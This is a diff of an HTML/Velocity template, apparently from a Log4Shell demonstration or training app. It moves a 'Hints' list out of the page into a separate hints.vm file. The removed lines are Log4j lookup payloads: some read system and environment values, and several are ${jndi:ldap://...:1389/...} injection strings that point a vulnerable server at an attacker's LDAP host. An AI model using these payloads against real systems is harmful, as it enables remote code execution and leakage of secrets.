@@ -26,17 +26,7 @@
                 <div class="card" >
                     <div class="card-body">
                         <h5 class="card-title">Hints</h5>
-
-                        <ul class="list-group">
-                            <li class="list-group-item">&#36;{sys:java.version}</li>
-                            <li class="list-group-item">&#36;{sys:java.class.path}</li>
-                            <li class="list-group-item">&#36;{sys:java.home}</li>
-                            <li class="list-group-item">&#36;{log4j:configLocation}</li>
-                            <li class="list-group-item">&#36;{env:MODE}</li>
-                            <li class="list-group-item">&#36;{jndi:ldap://${ldapaddr}:1389/a}</li>
-                            <li class="list-group-item">&#36;{jndi:ldap://${ldapaddr}:1389/cn=version,dc=example,dc=org}</li>
-                            <li class="list-group-item">&#36;{jndi:ldap://${ldapaddr}:1389/cn=bogus}</li>
-                        </ul>
+                        #parse("/velocity/hints.vm")
                     </div>
                 </div>
                 <div class="card">
